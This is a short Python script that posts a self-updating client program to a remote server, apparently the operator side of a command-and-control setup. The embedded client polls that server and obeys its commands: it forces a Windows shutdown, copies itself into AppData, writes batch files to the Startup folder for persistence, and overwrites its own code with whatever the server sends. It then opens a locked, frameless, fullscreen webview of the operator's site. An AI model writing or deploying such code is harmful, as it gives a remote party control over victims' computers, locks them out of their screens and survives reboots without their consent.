import requests

requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'editwbcl', 'data': '''
import os
import sys
import shutil
import webview
import requests
import subprocess
from flask import Flask

app = Flask(__name__)
def shutdown():
    subprocess.call(['shutdown', '/s', '/t', '0'])
def create_shortcut():
    if getattr(sys, 'frozen', False):
        source_file = sys.executable
    else:
        source_file = os.path.abspath(__file__)
    destination_location = os.path.join(os.path.expanduser("~"), "AppData")
    startup_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "cslckr.bat")
    programs_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "cslckr.bat")
    if os.name == 'nt':
        shutil.copy(source_file, destination_location)
        with open(startup_shortcut_path, 'w') as f:
            f.write(f'start "" "{source_file}"')
        
        with open(programs_shortcut_path, 'w') as f:
            f.write(f'start "" "{source_file}"')
    else:
        print("Shortcut creation is only supported on Windows.")

def edit_wbcl():
    with open(__file__, 'w') as f:
        f.write(data)

response = requests.get('https://cslckrwbcl.lrdevstudio.com/messages')
if response.json != []:
    wbdata = response.json()[0]
    action = wbdata['action']
    data = wbdata['data']
    if action == 'create_shortcut':
        create_shortcut()
    elif action == 'shutdown':
        shutdown()
    elif action == 'editwbcl':
        edit_wbcl()

if __name__ == "__main__":
    webview.create_window("cslckrwbcl", "https://cslckrwbcl.lrdevstudio.com", frameless=True, resizable=False, fullscreen=True, draggable=False, zoomable=False)
    webview.start()

'''})